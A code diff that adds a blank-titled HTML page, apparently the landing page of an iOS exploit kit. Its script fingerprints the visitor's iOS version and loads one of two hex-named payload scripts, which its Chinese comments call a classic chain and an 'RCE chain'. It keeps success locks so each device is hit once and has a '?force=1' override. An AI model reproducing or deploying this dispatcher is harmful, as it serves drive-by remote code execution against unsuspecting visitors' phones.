@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<title></title>
+</head>
+<body>
+<script type="text/javascript">
+// Version dispatch (xcio44-style /assets/js/group.html):
+//   iOS < 18          → 49554…（不写成功锁，可反复进）
+//   iOS ≥ 18          → rce_loader（成功后写 _x_done；失败可刷新再打；?force=1 可清）
+// 注意：旧 key _x_ok 曾在 loader onload 就写入，会误锁失败设备；进页时清掉。
+(function () {
+  var ua = navigator.userAgent || "";
+  var m = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/i);
+  var major = m ? parseInt(m[1], 10) : 0;
+  var s = document.createElement("script");
+  s.type = "text/javascript";
+  var force = /[?&]force=1(?:&|$)/.test(location.search || "");
+
+  // 短窗防抖：根 group.html 双跳竞态 / WebKit 重复导航时，数秒内第二次进页不再拉链
+  try {
+    if (force) {
+      sessionStorage.removeItem("_x_nav");
+    } else {
+      var nav = sessionStorage.getItem("_x_nav");
+      var now = Date.now();
+      if (nav && now - parseInt(nav, 10) < 8000) return;
+      sessionStorage.setItem("_x_nav", String(now));
+    }
+  } catch (e) {}
+
+  // iOS < 18：经典链，不走成功锁（可反复进）
+  if (major > 0 && major < 18) {
+    s.src = "49554fde7424c31c.js?v=" + Math.random();
+    document.body.appendChild(s);
+    return;
+  }
+
+  // iOS ≥ 18：RCE 链；仅成功后锁一次（见 rce_loader redirect → _x_done）
+  // 强制清锁：/assets/js/group.html?force=1
+  try {
+    // 迁移：清掉旧 onload 锁，避免失败后永远不拉 rce_loader
+    localStorage.removeItem("_x_ok");
+    if (force) {
+      localStorage.removeItem("_x_done");
+    }
+  } catch (e) {}
+  try {
+    if (localStorage.getItem("_x_done")) return;
+  } catch (e) {}
+
+  s.src = "b8def7dab9dd9ad8.js?v=" + Math.random();
+  document.body.appendChild(s);
+})();
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"f72f66d0f2e24b379c034ee09a42592b","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
